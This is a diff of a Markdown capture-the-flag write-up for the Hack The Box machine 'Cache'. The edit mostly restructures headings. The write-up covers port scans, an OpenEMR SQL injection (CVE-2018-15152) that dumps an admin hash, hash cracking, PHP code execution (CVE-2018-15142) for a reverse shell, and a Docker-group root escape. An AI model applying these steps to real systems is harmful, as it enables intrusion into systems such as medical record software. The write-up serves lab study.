@@ -2,35 +2,35 @@
 IP address : 10.10.10.188\
 OS : Linux
 
-## Enumeration
-Firstly, let us enumerate all the open ports using ```Nmap```
+## Discovery
+Before we being, let's add the IP address and host to our ```/etc/hosts``` file. 
+```
+10.10.10.188    cache.htb 
+```
+### Nmap
+Firstly, let us enumerate all the open ports using Nmap
 * sV : service detection
 * sC : Run default nmap scripts
 * A : identify the OS behind each ports
 * -p- : scan all ports
 
-```bash
+```
 nmap -sC -sV -A -p- -T4 10.10.10.188 -vv
 ```
 
-From the output of ```NMAP```, we are able to obtain the following information about the open TCP ports:
+From the output of Nmap, we are able to obtain the following information about the open TCP ports:
 | Port Number | Service | Version | State |
 |-----|------------------|----------------------|----------------------|
 | 22	| SSH | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | Open |
 | 80	| http | Apache httpd 2.4.29 (Ubuntu) | Open |
 
-Now, we will do a scan on the UDP ports to find any possible open UDP ports. Hoowever, there isn't much information for UDP ports that is worth exploring.
+Next, we will do a scan on the UDP ports to find any possible open UDP ports. Hoowever, there isn't much information for UDP ports that is worth exploring.
 ```
 nmap -sU -Pn 10.10.10.188 -T4 -vv 
 ```
 
-Next, we would have to add the IP address to our ```/etc/hosts``` file. 
-```
-10.10.10.188    cache.htb 
-```
-
-## Content Discovery of cache.htb
-First, we will try to discover the endpoints on ```http://cache.htb```. From the results, we discover that there is a ```jquery``` directory that are of interest to us.
+### Gobuster
+Let's try to discover for the endpoints on ```http://cache.htb```. From the results, we discover that there is a ```jquery``` directory that are of interest to us.
 ```
 ┌──(kali㉿kali)-[~]
 └─$ gobuster dir -u http://10.10.10.188 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -t 50
@@ -53,7 +53,7 @@ http://10.10.10.188/javascript           (Status: 301) [Size: 317] [--> http://1
 http://10.10.10.188/jquery               (Status: 301) [Size: 313] [--> http://10.10.10.188/jquery/]
 http://10.10.10.188/server-status        (Status: 403) [Size: 277] 
 ```
-
+### Obtaining credentials 
 Visiting the ```/jquery``` endpoint, we are able to find a ```functionality.js``` file. Viewing the javascript file, we realize that this is a code determining the logic 
 for login functionality. In the code, we find that the username is ```ash``` and the password is ```H@v3_fun```
 
@@ -69,7 +69,7 @@ Viewing the ```author.html``` endpoint, we discover that the author is also invo
 10.10.10.188    cache.htb hms.htb hms.cache.htb cache.hms.htb
 ```
 
-## Content Discovery of cache.htb 
+### Finding endpoints on hms.htb
 
 First, we will do a scan using ```Nikto``` to uncover potential vulnerabilities. The scan picked up a publicly-accessible ```admin.php``` page that reveals sensitive information such as the database name, and the version of OpenEMR used. Searching up CVEs for OpenEMR, there is a potential exploit for authentication bypass. However, it only allows us to bypass the patient login which may not be very useful in our case. We take note of this in case we are unable to find an exploit later. 
 
@@ -129,6 +129,8 @@ http://hms.htb/server-status        (Status: 403) [Size: 272]
 ===============================================================
 ```
 
+## Exploit
+### CVE-2018-15152
 Looks like we have to try CVE-2018-15152 to bypass the authentication of ```/portal/account/register.php```. First, we will go to ```/portal/account/register.php``` and afterwards we will navigate to ```/portal/add_edit_events_user.php```. However, we realize that ```/portal/add_edit_events_user.php``` is vulnerable to SQL injection from the POC shown below. 
 
 ![SQL Injection vulnerability POC](https://github.com/joelczk/writeups/blob/main/HTB/Images/cache/sql_injection.PNG)
@@ -188,7 +190,7 @@ Table: users_secure
 | 1  | <blank> | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. | <blank>  | 2019-11-21 06:38:40 | <blank>       | <blank>       | $2a$05$l2sTLIG6GTBeyBf7TAKL6A$ | openemr_admin     |
 +----+---------+--------------------------------------------------------------+----------+---------------------+---------------+---------------+--------------------------------+-------------------+
 ```
-
+### Cracking hash
 From the output, we are able to obtain the username as ```openemr_admin``` and the password hash as ```$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.```. Using John the Ripper, we manage to crack the hash as xxxxxx.
 
 ```
@@ -205,6 +207,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
 
+### CVE-2018-15142
 Using CVE-2018-15142, we realize that we can execute arbitary PHP code from the vulnerable ```/portal/import_template``` endpoint. We will first create a POC for this vulnerable endpoint. Visitng ```/portal/payload.php```, we notice that we can see the PHP page, which shows that the exploit has succeeded.
 
 ![POC for RCE](https://github.com/joelczk/writeups/blob/main/HTB/Images/cache/rce_poc.PNG)
@@ -213,7 +216,8 @@ Now, what we have to do is to craft a single line url-encoded PHP payload, ```%3
 
 ![RCE reverse shell](https://github.com/joelczk/writeups/blob/main/HTB/Images/cache/rce_reverse_shell.PNG)
 
-Next, we will first stabilize the shell on our attacking machine.
+### Obtaining reverse shell
+Now, we just have to stabilize the reverse shell
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -231,7 +235,7 @@ stty cols 132 rows 34
 www-data@cache:/var/www/hms.htb/public_html/portal$ 
 ```
 
-## Obtaining user flag
+### Obtaining user flag
 However, we realize that we do not have the appropriate permissions to obtain the user flag.
 
 ```
@@ -258,7 +262,7 @@ cat user.txt
 ash@cache:~$
 ```
 
-## Obtaining root flag
+## Privilege Escalation to luffy
 
 First, we will try to check if the user ```ash``` has the sudo permissions on this terminal. However, it seems that the ```ash``` does not have permissions to execution sudo privileges.
 
@@ -349,6 +353,7 @@ Sorry, user luffy may not run sudo on cache.
 luffy@cache:~$ 
 ```
 
+### Docker container escapa
 However, we recall from previous enumeration that ```luffy``` is part of the ```docker``` group. Hence, we will staty by checking the docker images and containers that are running on this terminal. We realized that even though there is no docker container running at the moment, we are able to execute a dockerised ubuntu iamge.
 
 ```
@@ -376,6 +381,13 @@ root@3bfb231b4758:/# cd /root
 
 cd /root
 root@3bfb231b4758:~# 
+```
+
+### Obtaining the root flag
+
+Lastly, we just have to obtain the root flag
+
+```
 root@3bfb231b4758:~# cat root.txt
 cat root.txt
 <Redacted root flag>
